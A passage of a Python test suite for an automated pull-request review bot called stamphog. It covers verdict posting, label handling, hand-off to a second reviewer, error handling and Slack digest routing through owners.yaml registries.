    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=102, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-y",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
    )

    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture"):
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "late digest stamp blew up"))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    assert not run.error


def _refused_engine_output() -> str:
    payload = {
        "final_verdict": "REFUSED",
        "reviewer": {"reasoning": "Touches risky territory without assurance.", "issues": ["billing change"]},
        "gates": [{"name": "size", "passed": True}],
        "review_body": "Refused by stamphog.",
    }
    return json.dumps(payload)


@pytest.mark.parametrize(
    "review_mode,expect_strip",
    [(ReviewMode.LABEL, True), (ReviewMode.ALL, False)],
    ids=["label_mode_strips_trigger_label", "all_mode_leaves_labels_alone"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_refused_verdict_strips_trigger_label_only_in_label_mode(
    team, stamphog_chain: StamphogChain, review_mode: ReviewMode, expect_strip: bool
) -> None:
    # Action parity: in label-triggered mode a refusal removes the trigger label so the author
    # explicitly re-requests the next review; in ALL mode labels are never touched.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = review_mode
    repo_config.save()
    head_sha = "sha-refused"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": _refused_engine_output()},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    run.refresh_from_db()
    assert run.verdict == ReviewVerdict.REFUSED
    label_removals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "remove_label"]
    if expect_strip:
        assert label_removals == [{"kind": "remove_label", "repo": REPO, "number": 101, "label": "stamphog"}]
    else:
        assert label_removals == []

    # Neither mode hands off to ReviewHog: this PR has a human author who reads the refusal, so a
    # second unrequested bot review is not stamphog's call to make. Only self-driving runs hand off
    # (test_refused_verdict_hands_off_to_reviewhog_only_when_self_driving).
    assert [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "add_label"] == []


@pytest.mark.parametrize(
    "review_mode,inbox_review,expect_handoff",
    [
        (ReviewMode.ALL, {"trigger": "inbox"}, True),
        (ReviewMode.LABEL, {"trigger": "inbox"}, True),
        (ReviewMode.ALL, None, False),
        (ReviewMode.LABEL, None, False),
    ],
    ids=[
        "self_driving_in_all_mode_hands_off",
        "self_driving_in_label_mode_hands_off",
        "human_pr_in_all_mode_does_not",
        "human_pr_in_label_mode_does_not",
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_refused_verdict_hands_off_to_reviewhog_only_when_self_driving(
    team,
    stamphog_chain: StamphogChain,
    review_mode: ReviewMode,
    inbox_review: dict | None,
    expect_handoff: bool,
) -> None:
    # A self-driving PR has no author to read the refusal, so ReviewHog's deeper review is the next
    # step; a human PR's author decides that for themselves. Inbox provenance outranks the repo's
    # review mode both ways, which is why the mode is crossed with it here: an ALL-mode repo must
    # still hand off its self-driving PRs, and must not hand off the human ones it reviews by default.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = review_mode
    repo_config.save()
    head_sha = "sha-refused-handoff-trigger"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    output: dict = {"reviewer_raw": _refused_engine_output()}
    if inbox_review is not None:
        output["inbox_review"] = inbox_review
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output=output,
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    run.refresh_from_db()
    assert run.verdict == ReviewVerdict.REFUSED
    label_adds = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "add_label"]
    expected = [{"kind": "add_label", "repo": REPO, "number": 101, "labels": ["reviewhog"]}]
    assert label_adds == (expected if expect_handoff else [])


@pytest.mark.parametrize(
    "fault",
    [
        # The client swallows a 422 (label missing on the repo) itself; a 500 raises StamphogGitHubError.
        pytest.param(422, id="swallows_missing_label"),
        pytest.param(500, id="client_raises_on_500"),
        # The egress layer raises these directly — not subclasses of StamphogGitHubError, so a narrow
        # except would let them escape post_verdict and skip the durable verdict save below.
        pytest.param(GitHubRateLimitError("secondary rate limit"), id="rate_limit_does_not_escape"),
        pytest.param(requests.ConnectionError("network blip"), id="network_error_does_not_escape"),
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_refused_verdict_lands_even_when_reviewhog_handoff_fails(
    team,
    stamphog_chain: StamphogChain,
    fault: int | Exception,
) -> None:
    # The ReviewHog handoff is a secondary, cross-product notification that runs AFTER the durable
    # terminal save, so the refusal itself is never at risk — it's already committed by the time the
    # handoff fires. Left uncaught, though, the exception would fail the activity and trigger a retry,
    # re-running already-succeeded side effects (posting the sticky comment, stripping the trigger
    # label) even though the verdict is saved; catching it keeps the handoff single-shot best-effort.
    # A 422 is swallowed inside the client; a 500 raises StamphogGitHubError; a rate limit raises
    # GitHubRateLimitError and a network blip raises requests.RequestException from the egress layer.
    # All four must leave the run COMPLETED + REFUSED, not FAILED. The latter two are the regression:
    # they are not subclasses of StamphogGitHubError, so only a broad catch at the call site contains
    # them. The run carries inbox provenance because only a self-driving refusal reaches the handoff.
    repo_config = _repo_config(team.id)
    head_sha = "sha-refused-handoff"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    if isinstance(fault, Exception):
        stamphog_chain.recorder.add_label_side_effect = fault
    else:
        stamphog_chain.recorder.add_label_response_override = fakes.FakeResponse(fault, text="handoff failure")
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": _refused_engine_output(), "inbox_review": {"trigger": "inbox"}},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.REFUSED


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_superseded_refusal_does_not_hand_off_to_reviewhog(team, stamphog_chain: StamphogChain) -> None:
    # The ReviewHog handoff runs AFTER the conditional terminal save, so a refusal that loses the save
    # to a supersession (a synchronize/re-review delivery landing between the head guard and the save)
    # must not trigger ReviewHog for the stale refusal — a newer run may approve the same head. The run
    # returns skipped_superseded and the reviewhog label is never added. The run carries inbox
    # provenance so the supersession is what blocks the handoff, not the self-driving-only condition.
    repo_config = _repo_config(team.id)
    head_sha = "sha-refused-superseded"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": _refused_engine_output(), "inbox_review": {"trigger": "inbox"}},
    )
    # A concurrent delivery flips the run to SUPERSEDED during the non-approval review post (before the
    # terminal save), so the conditional .exclude(status=SUPERSEDED).update(...) matches nothing and the
    # run returns skipped_superseded. This reaches the terminal-save early return, NOT the top guard —
    # the run is REVIEWING at load.
    original_post_review = activities._post_non_approval_review

    def _supersede_then_post(client, repo, posting_run, pr, team_id, body) -> None:
        ReviewRun.objects.for_team(team.id).filter(id=run.id).update(status=ReviewRunStatus.SUPERSEDED)
        original_post_review(client, repo, posting_run, pr, team_id, body)

    with patch.object(activities, "_post_non_approval_review", side_effect=_supersede_then_post):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_superseded"}
    assert [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "add_label"] == []


@pytest.mark.parametrize(
    "approved_at_sha,expected_audience_key",
    [
        ("sha-merged", "team-devex"),
        (None, ""),
        ("sha-earlier", ""),
    ],
    ids=["approved_at_merged_head", "never_approved", "approved_at_earlier_head"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_merged_pr_digest_eligibility_gate(
    team,
    stamphog_chain: StamphogChain,
    approved_at_sha: str | None,
    expected_audience_key: str,
) -> None:
    # Regression guard: the approved-head_sha eligibility gate. Merge facts are always recorded,
    # but audiences are stamped only when a stamphog-approved run exists at the exact merged head
    # SHA — that run is also where the ownership the audience is built from comes from.
    repo_config = _repo_config(team.id)
    author, merged_head = "devex-dev", "sha-merged"
    _make_pr_with_review(team.id, repo_config, number=101, author=author, approved_at_sha=approved_at_sha)

    status = stamphog_chain.post_webhook(_merged_event(101, author, merged_head), delivery_id=str(uuid.uuid4()))
    assert status == 202

    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=101)
    assert pr.merged_at is not None
    assert pr.merge_commit_sha == "merge101"
    assert _audience_keys(team.id, pr) == ([expected_audience_key] if expected_audience_key else [])


def _audience_keys(team_id: int, pull_request: PullRequest) -> list[str]:
    return sorted(
        PullRequestAudience.objects.for_team(team_id)
        .filter(pull_request=pull_request)
        .values_list("audience_key", flat=True)
    )


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_unreadable_owners_registry_posts_nothing(team, stamphog_chain: StamphogChain) -> None:
    # Routing is derived every run and never cached, so a fetch failure does not read as "this team
    # has no entry" — it silently reroutes. The unreadable repo could be the one every other repo
    # inherits from, so the whole team's run stops and the merges wait for tomorrow. A repo that is
    # permanently broken gets switched off, which drops it from the candidate list.
    repo_config = _repo_config(team.id)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    pr = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="apm-dev", merged_at=timezone.now()
    )
    PullRequestAudience.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pr, audience_key="logs", reason=AudienceReason.OWNED
    )
    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-LOGS", "name": "logs"}])

    with patch(
        "products.stamphog.backend.logic.channel_resolution.StamphogGitHubClient",
        side_effect=RuntimeError("github down"),
    ):
        send_daily_digests()

    assert not DigestRun.objects.for_team(team.id).exists()
    assert fakes.FakeSlackIntegration.posted_messages == []


# posthog_owners validates the whole document, so the registry has to arrive inside a real one.
_OWNERS_YAML_HEAD = "version: 1\nowners: []\n"


@pytest.mark.parametrize(
    "registry_yaml,workspace_channels,expected",
    [
        (
            _OWNERS_YAML_HEAD + "teams:\n  logs:\n    slack: '#team-apm'\n",
            [{"id": "C-APM", "name": "team-apm"}],
            ("C-APM", True, ChannelResolutionSource.OWNERS_CONTACT),
        ),
        (_OWNERS_YAML_HEAD + "teams:\n  logs:\n    slack: false\n", [{"id": "C-LOGS", "name": "logs"}], None),
        (
            _OWNERS_YAML_HEAD + "teams:\n  other-team:\n    slack: '#elsewhere'\n",
            [{"id": "C-LOGS", "name": "logs"}],
            ("C-LOGS", True, ChannelResolutionSource.SLACK_NAME_MATCH),
        ),
        (_OWNERS_YAML_HEAD + "teams:\n  logs:\n    slack: '#team-apm'\n", [{"id": "C-LOGS", "name": "logs"}], None),
    ],
    ids=[
        "declared_channel_provisions_enabled",
        "declared_no_channel_stops",
        "no_entry_falls_through_to_name_match",
        "declared_channel_missing_never_falls_back_to_the_slug",
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_owners_registry_routes_a_team_whose_channel_is_not_its_slug(
    team, stamphog_chain: StamphogChain, registry_yaml: str, workspace_channels: list, expected: tuple | None
) -> None:
    # The derived "#<slug>" is wrong for the teams whose channel was named before the slug existed
    # ("logs" posts to #team-apm), which is exactly what the owners.yaml registry records. Two of
    # these guard deliberate dead ends: `slack: false` is an answer, not a gap, and a declared
    # channel that is missing must never retry the slug — the slug is the name it was correcting.
    repo_config = _repo_config(team.id)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    stamphog_chain.recorder.policy_files["owners.yaml"] = registry_yaml
    pr = PullRequest.objects.for_team(team.id).create(
        team_id=team.id,
        repo_config=repo_config,
        pr_number=101,
        title="Tune the log ingestion batch size",
        author_login="apm-dev",
        pr_url=f"https://github.com/{REPO}/pull/101",
        merged_at=timezone.now(),
    )
    PullRequestAudience.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pr, audience_key="logs", reason=AudienceReason.OWNED
    )
    fakes.FakeSlackIntegration.reset(channels=workspace_channels)

    send_daily_digests()

    runs = list(DigestRun.objects.for_team(team.id).filter(audience_key="logs"))
    if expected is None:
        assert runs == []
        assert PullRequestAudience.objects.for_team(team.id).get(audience_key="logs").digest_run_id is None
        return
    channel_id, _, source = expected
    assert [(r.slack_channel_id, r.resolution_source) for r in runs] == [(channel_id, source)]


def _merged_pr_with_audience(
    team_id: int, repo_config: StamphogRepoConfig, *, number: int, audience_key: str
) -> PullRequest:
    pr = PullRequest.objects.for_team(team_id).create(
        team_id=team_id,
        repo_config=repo_config,
        pr_number=number,
        title="Bump the deployment image tag",
        author_login="devex-dev",
        pr_url=f"https://github.com/{repo_config.repository}/pull/{number}",
        merged_at=timezone.now(),
    )
    PullRequestAudience.objects.for_team(team_id).create(
        team_id=team_id, pull_request=pr, audience_key=audience_key, reason=AudienceReason.AUTHORED
    )
    return pr


_STANDUP_REGISTRY = _OWNERS_YAML_HEAD + "teams:\n  team-devex:\n    slack: '#team-devex-standup'\n"
_DEVEX_WORKSPACE = [
    {"id": "C-STANDUP", "name": "team-devex-standup"},
    {"id": "C-DEVEX", "name": "team-devex"},
]


@pytest.mark.parametrize("registry_repo_digest_enabled", [True, False])
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_registry_of_one_connected_repo_routes_an_audience_from_a_repo_without_one(
    team, stamphog_chain: StamphogChain, registry_repo_digest_enabled: bool
) -> None:
    # A deployment repo carries no ownership metadata, so its merges resolve to the author's team
    # slug and nothing else. Reading only the repo the merge came from would name-match that slug
    # and bind the team to a disabled #team-devex, even though a repo it also connected declares
    # the real channel. Every repo the team still uses is a candidate registry, so the declaration
    # wins — including from a repo whose own digests are off, since the registry is ownership
    # metadata rather than digest configuration.
    _repo_config(team.id, repository="acme/charts")
    _repo_config(team.id, repository="acme/widgets", digest_enabled=registry_repo_digest_enabled)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    stamphog_chain.recorder.repo_files[("acme/widgets", "owners.yaml")] = _STANDUP_REGISTRY
    _merged_pr_with_audience(
        team.id,
        StamphogRepoConfig.objects.for_team(team.id).get(repository="acme/charts"),
        number=101,
        audience_key="team-devex",
    )
    fakes.FakeSlackIntegration.reset(channels=_DEVEX_WORKSPACE)

    send_daily_digests()

    run = DigestRun.objects.for_team(team.id).get(audience_key="team-devex")
    assert (run.slack_channel_id, run.resolution_source) == ("C-STANDUP", ChannelResolutionSource.OWNERS_CONTACT)


@pytest.mark.parametrize(
    "audience_repository,expected_channel",
    [("acme/aardvark", "C-STANDUP"), ("acme/widgets", "C-DEVEX")],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_each_repos_registry_answers_for_its_own_merges(
    team, stamphog_chain: StamphogChain, audience_repository: str, expected_channel: str
) -> None:
    # Two repos naming different channels for one team is a scope, not a race. Each answers for the
    # merges that came from it, so neither declaration is discarded and no sort order decides. The
    # old behavior bound the team to one channel forever, whichever provisioned first.
    _repo_config(team.id, repository="acme/aardvark")
    _repo_config(team.id, repository="acme/widgets")
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    stamphog_chain.recorder.repo_files[("acme/aardvark", "owners.yaml")] = _STANDUP_REGISTRY
    stamphog_chain.recorder.repo_files[("acme/widgets", "owners.yaml")] = (
        _OWNERS_YAML_HEAD + "teams:\n  team-devex:\n    slack: '#team-devex'\n"
    )
    _merged_pr_with_audience(
        team.id,
        StamphogRepoConfig.objects.for_team(team.id).get(repository=audience_repository),
        number=101,
        audience_key="team-devex",
    )
    fakes.FakeSlackIntegration.reset(channels=_DEVEX_WORKSPACE)

    send_daily_digests()

    assert DigestRun.objects.for_team(team.id).get(audience_key="team-devex").slack_channel_id == expected_channel


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_daily_digest_posts_to_a_name_matched_channel_it_was_never_invited_to(
    team, stamphog_chain: StamphogChain
) -> None:
    # A team's first digest must land without anyone wiring it up: the audience_key name-matches a
    # workspace channel, the app joins one it was never invited to, and the merged PR goes out on
    # that run rather than waiting on a human to flip a toggle nobody is watching.
    repo_config = _repo_config(team.id)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    pr = PullRequest.objects.for_team(team.id).create(
        team_id=team.id,
        repo_config=repo_config,
        pr_number=101,
        title="Add util helper",
        author_login="devex-dev",
        pr_url=f"https://github.com/{REPO}/pull/101",
        merged_at=timezone.now(),
    )
    PullRequestAudience.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pr, audience_key="team-devex", reason=AudienceReason.OWNED
    )
    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-DEVEX", "name": "team-devex"}], needs_join=["C-DEVEX"])

    send_daily_digests()

    assert fakes.FakeSlackIntegration.joined_channels == ["C-DEVEX"]

    run = DigestRun.objects.for_team(team.id).get(audience_key="team-devex")
    assert run.status == DigestRunStatus.COMPLETED
    assert (run.slack_channel_id, run.resolution_source) == ("C-DEVEX", ChannelResolutionSource.SLACK_NAME_MATCH)
    posted = fakes.FakeSlackIntegration.posted_messages
    # The channel gets the lead, and the change lines hang off it in a thread.
    assert [p["channel"] for p in posted] == ["C-DEVEX", "C-DEVEX"]
    assert [p["thread_ts"] for p in posted] == [None, "1234.5678"]
    # The thread's notification preview is the change itself, with the PR number only inside the link.
    assert posted[1]["text"] == "Add util helper"
    # The thread leads with whose judgment picked its contents, then one section per change.
    thread_blocks = posted[1]["blocks"]
    assert thread_blocks[0]["elements"][0]["text"] == _THREAD_LEAD
    sections = [b["text"]["text"] for b in thread_blocks if b.get("type") == "section"]
    assert any("/pull/101|" in text for text in sections)
    assert PullRequestAudience.objects.for_team(team.id).get(pull_request=pr).digest_run_id == run.id


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_repo_declared_digest_channel_routes_alongside_owning_teams(team, stamphog_chain: StamphogChain) -> None:
    # Regression guard: the repo-declared digest path. A repo that declares digest.channel in
    # .stamphog/policy.yml adds a "repo:" audience carrying every one of its merges, routed to the
    # declared channel via the STAMPHOG_CONFIG resolution source. It sits beside the owning teams
    # rather than replacing them, so a shared repo can feed both at once. Only the declared channel
    # exists in the workspace here, so it is the only one that posts.
    repo_config = _repo_config(team.id)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    author, merged_head = "devex-dev", "sha-merged"
    stamphog_chain.recorder.policy_files[".stamphog/policy.yml"] = "digest:\n  channel: eng-merges\n"
    _make_pr_with_review(team.id, repo_config, number=101, author=author, approved_at_sha=merged_head)

    stamphog_chain.post_webhook(_merged_event(101, author, merged_head), delivery_id=str(uuid.uuid4()))
    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=101)
    assert sorted(_audience_keys(team.id, pr)) == sorted([f"repo:{REPO}", "team-devex"])

    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-ENG", "name": "eng-merges"}])
    send_daily_digests()

    run = DigestRun.objects.for_team(team.id).get(audience_key=f"repo:{REPO}")
    assert run.resolution_source == ChannelResolutionSource.STAMPHOG_CONFIG
    assert {m["channel"] for m in fakes.FakeSlackIntegration.posted_messages} == {"C-ENG"}


@pytest.mark.parametrize(
    "channel_flags,expect_routed",
    [
        ({}, True),
        ({"is_ext_shared": True}, False),
        ({"is_pending_ext_shared": True}, False),
        ({"is_shared": True}, False),
    ],
    ids=["ordinary_channel_routes", "ext_shared_skipped", "pending_ext_shared_skipped", "org_shared_skipped"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_routing_skips_shared_channels(
    team, stamphog_chain: StamphogChain, channel_flags: dict, expect_routed: bool
) -> None:
    # A name match puts an audience_key onto a Slack channel nobody chose for it. A shared channel
    # (Slack Connect or org-shared) carrying that name would route internal PR digests to another
    # org — a leak. Only ordinary internal channels are matched this way.
    _repo_config(team.id)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-DEVEX", "name": "team-devex", **channel_flags}])

    context = build_routing_context(team.id)
    assert isinstance(context, RoutingContext)
    destination = resolve_destination(context, "team-devex", REPO)

    if expect_routed:
        assert destination is not None and destination.channel_id == "C-DEVEX"
    else:
        assert destination is None


@pytest.mark.parametrize(
    "live_head,expected_audience",
    [
        ("sha-merged", "team-devex"),
        ("sha-newer", ""),
        ("", ""),
    ],
    ids=["merged_at_approved_head_stamps", "merged_at_newer_head_not_stamped", "unconfirmable_head_not_stamped"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_post_verdict_stamps_digest_audience_only_at_approved_head(
    team, stamphog_chain: StamphogChain, live_head: str, expected_audience: str
) -> None:
    # Merge-before-approval race: if the PR already merged when the approval lands, post_verdict stamps
    # the digest audience — but ONLY when the PR's live head is exactly the head this run approved. An
    # approval covers one commit, so a PR pushed to (and merged at) a newer head, or one whose head can't
    # be confirmed, must not inherit digest eligibility from an approval that never saw that head. This
    # mirrors the webhook-side approved-at-head gate in _record_merged_pull_request. The matching-head
    # case also guards the original fix: the APPROVED verdict is saved first, then the stamp runs, so a
    # merged+approved PR reaches the digest even though the closed webhook saw no approved run yet.
    repo_config = _repo_config(team.id)
    approved_head = "sha-merged"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", live_head))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev", merged_at=timezone.now()
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=approved_head,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": fakes.approved_engine_output(), "pr": _pr_object(101, "devex-dev", approved_head)},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    pull_request.refresh_from_db()
    assert _audience_keys(team.id, pull_request) == ([expected_audience] if expected_audience else [])
    if expected_audience:
        run.refresh_from_db()
        assert run.verdict == ReviewVerdict.APPROVED
        # The digest has no diff of its own, so it reads what the reviewer wrote while it had one.
        assert run.change_summary.startswith("Docs gain a setup section")
        assert pull_request.summary_line == run.change_summary


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_each_non_approval_posts_its_own_review(team, stamphog_chain: StamphogChain) -> None:
    # Every verdict has to land in the Reviews section, the same list the approvals land in. A refusal
    # written into an edited issue comment notified nobody and sat in a different list from the
    # approval that later replaced it, so a stale refusal outlived the approval it contradicted. Each
    # run posts its own review, pinned to the head it judged, saying the outcome in words — the
    # engine's own body never does, and renders every gate row as a tick even on a refusal.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = ReviewMode.LABEL
    repo_config.save()
    head_sha = "sha-refused"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )

    for _ in range(2):
        run = ReviewRun.objects.for_team(team.id).create(
            team_id=team.id,
            pull_request=pull_request,
            head_sha=head_sha,
            status=ReviewRunStatus.REVIEWING,
            output={"reviewer_raw": _refused_engine_output()},
        )
        # Twice per run: a Temporal retry after the post must not repeat the review.
        _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
        _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    writes = stamphog_chain.recorder.github_writes
    assert [w for w in writes if w["kind"] in ("issue_comment", "issue_comment_edit")] == []
    reviews = [w for w in writes if w["kind"] == "comment_review"]
    assert len(reviews) == 2
    for review in reviews:
        # COMMENT, never REQUEST_CHANGES: declining to auto-approve must not block a human merging.
        assert review["body"]["event"] == "COMMENT"
        assert review["body"]["commit_id"] == head_sha
        assert review["body"]["body"].startswith("**Not approved")
        # LABEL mode strips the trigger label, so the review has to say how to ask again.
        assert "Re-add the `stamphog` label" in review["body"]["body"]


@pytest.mark.parametrize(
    "comment_user_type,expect_patch",
    [("User", False), ("Bot", True)],
    ids=["user_planted_marker_ignored", "own_bot_comment_patched"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sticky_comment_only_edits_the_apps_own_comment(
    stamphog_chain: StamphogChain, comment_user_type: str, expect_patch: bool
) -> None:
    # The sticky marker is visible in the comment source, so a user could plant it to make the bot PATCH
    # (hijack) their comment. Only a Bot-authored comment carrying the marker may be edited; a user's is
    # ignored and a fresh comment is posted. (App slug is unset in tests, so any Bot author qualifies.)
    # Verdicts no longer upsert, so the remaining caller is the bot-author label cleanup.
    stamphog_chain.recorder.issue_comments[(REPO, 101)] = [
        {
            "id": 4242,
            "body": f"{STICKY_COMMENT_MARKER}\nstatus",
            "user": {"login": "someone", "type": comment_user_type},
        }
    ]

    StamphogGitHubClient(INSTALLATION_ID).upsert_sticky_comment(REPO, 101, "status")

    writes = stamphog_chain.recorder.github_writes
    patched = [w for w in writes if w["kind"] == "issue_comment_edit"]
    posted = [w for w in writes if w["kind"] == "issue_comment"]
    if expect_patch:
        assert len(patched) == 1
        assert posted == []
    else:
        assert patched == []
        assert len(posted) == 1


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_label_mode_synchronize_without_label_dismisses_stale_approval(team, stamphog_chain: StamphogChain) -> None:
    # LABEL-mode bypass: a synchronize without the trigger label is skipped before the review workflow,
    # so its dismiss_stale_approvals step never runs. The stale-approval retraction must still happen on
    # the skip path — otherwise removing the label + pushing commits leaves an old approval standing.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = ReviewMode.LABEL
    repo_config.save()
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    prior = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-old",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
        posted_review_id=777,
    )

    event = fakes.build_pull_request_event(
        action="synchronize",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=101,
        title="PR 101",
        body="body",
        author_login="devex-dev",
        head_sha="sha-new",
        head_ref="feat/pr-101",
        base_sha=BASE_SHA,
    )
    status = stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))
    assert status == 202

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    assert len(dismissals) == 1
    assert dismissals[0]["review_id"] == 777
    prior.refresh_from_db()
    assert prior.approval_dismissed_at is not None
    # The review itself stays gated: no new run is queued because the trigger label is absent.
    assert ReviewRun.objects.for_team(team.id).exclude(id=prior.id).count() == 0


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_inbox_review_approves_a_selfdriving_draft_pr_end_to_end(team, stamphog_chain: StamphogChain) -> None:
    # The receiver-leg chain, no webhook involved: process_inbox_pr_review -> real branch-linkage
    # match against the run's server-stamped state -> run stamped with inbox provenance -> real
    # activities -> sandbox context carries self_driving_review -> a real APPROVE posted on the
    # bot-authored DRAFT PR, pinned to its head. This is where the provenance-to-engine threading
    # is verified end to end — drop any link (branch not stamped, provenance not stamped, flag not
    # passed into the invocation) and the engine refuses the bot author instead of approving. The
    # linked run is COMPLETED, the normal end state right after the PR opens.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_branch = "posthog-self-driving/fix-the-thing-3f9a2c"
    pr_object = _pr_object(120, "posthog-code[bot]", "sha120a")
    pr_object["draft"] = True
    pr_object["state"] = "open"
    pr_object["user"]["type"] = "Bot"
    # Server-attested identity: the receiver requires a repo-native head authored by the App bot,
    # on the head branch the server pre-assigned to the implementation run.
    pr_object["head"]["repo"] = {"full_name": REPO}
    pr_object["head"]["ref"] = head_branch
    recorder.register_pr(REPO, 120, pr_object, _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    report = SignalReport.objects.create(
        team=team, status=SignalReport.Status.IN_PROGRESS, signal_count=1, total_weight=1.0
    )
    task = Task.objects.create(
        team=team,
